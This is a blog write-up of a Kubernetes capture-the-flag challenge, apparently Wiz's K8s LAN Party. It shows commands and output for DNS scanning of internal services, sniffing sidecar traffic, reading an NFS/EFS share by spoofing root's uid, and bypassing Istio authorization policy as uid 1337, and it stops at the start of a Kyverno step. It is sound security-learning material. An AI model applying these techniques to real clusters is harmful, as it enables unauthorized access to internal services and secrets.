I'm learning this stuff anyway, might as well get a blog post out of it.
# Recon
*You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further. AS a warmup, utilize [DNS scanning](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue) to uncover hidden internal services and obtain the flag. We have loaded your machine with dnscan to ease this process for further challenges*

Running `env`, we get a little bit of useful information:
```env
player@wiz-k8s-lan-party:~$ env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
USER_ID=ae87d509-7aca-4b8a-be93-2250ede729d6
HISTSIZE=2048
PWD=/home/player
HOME=/home/player
KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
HISTFILE=/home/player/.bash_history
TMPDIR=/tmp
TERM=xterm-256color
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
KUBERNETES_SERVICE_HOST=10.100.0.1
KUBERNETES_PORT=tcp://10.100.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
HISTFILESIZE=2048
_=/usr/bin/env
OLDPWD=/usr/bin
```

Looks like we know the IP of the kubernetes host. We can use this as the basis of our DNS scanning attempts:
```
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.0/24
```

This didn't reveal anything interesting, so let's broaden our search a little (by 256 times):
```shell
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.0/24
10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local.
```

We can curl that IP and get the flag:
```shell
player@wiz-k8s-lan-party:~$ curl 10.100.136.254
iz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
```

# Finding neighbors
*## Hello?
Sometimes, it seems we are the only ones around, but we should always be on guard against invisible [sidecars](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) reporting sensitive secrets.*

According to the link, sidecar containers are "secondary containers that run along with the main application container within the same Pod." It gives the example of a web application being teamed with a sidecar web server. Poking around, there's a suspicious looking `secrets` directory under `/var/run/`, but that didn't yield anything important except for some metadata about the cluster I'm experimenting with. Running `dnscan -subnet 10.100.0.0/16` reveals a service called `reporting-service.k8s-lan-party.svc.cluster`. I would bet that the vulnerability is that there is some sidecar container that is extricating sensitive information to `reporting-service`. Using `nmap` to scan the machine shows a whole bunch of open ports, none of them being useful. After being stuck for a bit, I looked up a tutorial that mentioned using `tcpdump` to capture traffic between the sidecar and `reporting-service`. Sure enough, running `tcpdump` shows that `192.168.16.65:38294` is sending a `POST` request to `reporting-service`. We can see the contents of that `POST` request using `-A`, and doing so reveals the flag, being extricated once every few seconds:
```HTTP
POST / HTTP/1.1
Host: reporting-service
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
```

After doing some reading, I discovered that kubernetes groups containers in the same pod into the same network namespace. When I first read this, I assumed that this meant the subnet, however turns out this means the same network interfaces, IP addresses, and ports. This basically means all the containers in a pod are logically a single container, which is why the main container is able to see traffic heading to a sidecar.

# Data Leakage
*## Exposed File Share
The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.*

No result in `dnscan -subnet 10.100.0.0/16`, and no suspicious traffic in `tcpdump`. However, when poking around, I did notice an extra root-level directory called `/efs`, which upon closer investigation is mounted to an Elastic File System integration.
```shell
player@wiz-k8s-lan-party:/efs$ mount | grep efs
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.57.108,local_lock=none,addr=192.168.124.98)
```

We can figure out where that endpoint is on the network using dig:
```shell
player@wiz-k8s-lan-party:/efs$ dig fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com

; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54906
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 9283a0d48a5129fb (echoed)
;; QUESTION SECTION:
;fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com. IN A

;; ANSWER SECTION:
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com. 30 IN A 192.168.124.98

;; Query time: 4 msec
;; SERVER: 10.100.13.164#53(10.100.13.164) (UDP)
;; WHEN: Wed Jul 17 22:24:34 UTC 2024
;; MSG SIZE  rcvd: 153
```

After spinning my wheels for a bit (and consulting another writeup), I found the `nfs-ls` and `nfs-cat` commands, which allow a user to execute `ls` and `cat` on AWS EFS instances. I tested this out by enumerating the directory:
```shell
player@wiz-k8s-lan-party:/efs$ nfs-ls nfs://192.168.124.98/
```

However, that froze, so I did some poking around the [libnfs](https://github.com/sahlberg/libnfs) documentation, which seemed to be the library I was using, and it turns out it defaults the NFS version to 3, when AWS EFS [uses version 4](https://docs.aws.amazon.com/efs/latest/ug/whatisefs.html). Specifying the version enumerates the contents of `/efs`:
```shell
player@wiz-k8s-lan-party:/efs$ nfs-ls nfs://192.168.124.98/?version=4
----------  1     1     1           73 flag.txt
```

Trying to access the `flag.txt` file with `nfs-cat` results in what I assume to be a permissions error:
```shell
player@wiz-k8s-lan-party:/efs$ nfs-cat "nfs://192.168.124.98//flag.txt?version=4"
Failed to open file /flag.txt: open call failed with "NFS4: (path /) failed with NFS4ERR_ACCESS(-13)"
Failed to open nfs://192.168.124.98//flag.txt?version=4
```

Luckily, [libnfs](https://github.com/sahlberg/libnfs) allows specifying which `uid` you're sending to the server using the `uid` parameter. This means we can make the EFS server think we're logged in as the root user:
```shell
player@wiz-k8s-lan-party:/efs$ nfs-cat "nfs://192.168.124.98//flag.txt?version=4&uid=0"
wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
```


# Bypassing Boundaries
*## The Beauty and The Ist
Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don't abuse this power; use it responsibly and with caution.*

We get a policy document also that I certainly noticed immediately and not after 20 minutes of running around in circles:
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: istio-get-flag
  namespace: k8s-lan-party
spec:
  action: DENY
  selector:
    matchLabels:
      app: "{flag-pod-name}"
  rules:
  - from:
    - source:
        namespaces: ["k8s-lan-party"]
    to:
    - operation:
        methods: ["POST", "GET"]
```

It looks like there's an `istio` sidecar container running on 10.10.224.159:
```
root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.0.0/16
57323 / 65536 [------------------------------------------------------------------------------------------------------------------------------------------------------------->______________________] 87.47% 982 p/s10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
root@wiz-k8s-lan-party:~# dig istio-protected-pod-service.k8s-lan-party.svc.cluster.local

; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> istio-protected-pod-service.k8s-lan-party.svc.cluster.local
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14627
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 05d55b2f90734578 (echoed)
;; QUESTION SECTION:
;istio-protected-pod-service.k8s-lan-party.svc.cluster.local. IN        A

;; ANSWER SECTION:
istio-protected-pod-service.k8s-lan-party.svc.cluster.local. 30 IN A 10.100.224.159

;; Query time: 0 msec
;; SERVER: 10.100.166.132#53(10.100.166.132) (UDP)
;; WHEN: Wed Jul 17 22:39:17 UTC 2024
;; MSG SIZE  rcvd: 175
```

`istio` is a "Service Mesh", which allows different containers to talk to each other using a simple sidecar proxy configuration:
![[Screenshot 2024-07-18 at 9.09.55 AM.png]]

This allows simple rulesets that govern communication between pods to be enforced.s

Curling that pod, we get an error that I'm assuming means the `AuthorizationPolicy` listed above triggered:
```
root@wiz-k8s-lan-party:~# curl -X GET 10.100.224.159
RBAC: access denied
```

I noticed that the policy only restricts GETs and POSTs, so I tried all the other possible HTTP verbs, but no dice. I poked around for a bit, and discovered in the `/etc/passwd` that there is an `istio` user. I switched to that user, and was able to retrieve the flag:
```
root@wiz-k8s-lan-party:~# su istio
$ curl 10.100.224.159 
wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
```

It looks like we can bypass `istio` authorization rules if we are the `istio` user. However, my security sense was buzzing, as all it would take to hop from container to container would be a simple `sh; su istio`, so I consulted a [different writeup](https://arnavtripathy98.medium.com/solving-a-kubernetes-ctf-k8s-lan-party-c773190e9246) by [Arnav Tripathy](https://arnavtripathy98.medium.com/). Arnav discovered a [blog post/vulnerability disclosure]() by [Denis Andzakovic](https://nz.linkedin.com/in/denis-andzakovic-59211328) where if the user assumes a `uid` of 1337, they are not bound to any of the network rules defined by the service mesh. There's something about how the `iptables` user has the same `uid` that I'm sure is relevant, but I skimmed it because I think I found the vulnerability I accidentally exploited. In the proof of concept, Arnav copied `curl`, gave ownership to a new user with `uid` 1337. This made all the requests coming from that particular binary immune to the kubernetes network rules. Turns out, that `istio` user has `uid` of 1337.

# Lateral Movement

*## Who will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the [administrative](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request) services.*

```yaml
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```

```shell
player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.0.0/16
10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```